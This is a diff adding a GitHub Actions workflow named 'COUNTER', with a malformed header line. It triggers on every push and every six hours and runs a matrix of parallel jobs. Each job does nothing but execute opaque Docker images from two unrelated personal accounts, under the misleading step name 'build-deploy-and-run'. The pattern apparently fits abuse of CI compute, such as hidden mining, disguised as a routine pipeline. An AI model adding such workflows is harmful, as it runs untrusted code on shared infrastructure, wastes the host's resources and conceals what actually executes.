@@ -1,0 +1,36 @@
+.github/workflows/Roland.ymlname: COUNTER
+on:   
+  push:
+  schedule: 
+  - cron: "0 */6 * * *"
+
+jobs:
+  A1:
+    runs-on: ubuntu-24.04
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        A1: [1.2]
+        flag: [A, B, C, D, E]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.A1 }}
+    steps:
+          - name: build-deploy-and-run
+            uses: docker://juanholley/4085:6533
+  B1:
+    needs: A1
+    runs-on: ubuntu-24.04
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        B1: [1.1]
+        flag: [A, B, C, D, E]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.B1 }}
+    steps:
+          - name: build-deploy-and-run
+            uses: docker://dawngardea/9983:2682
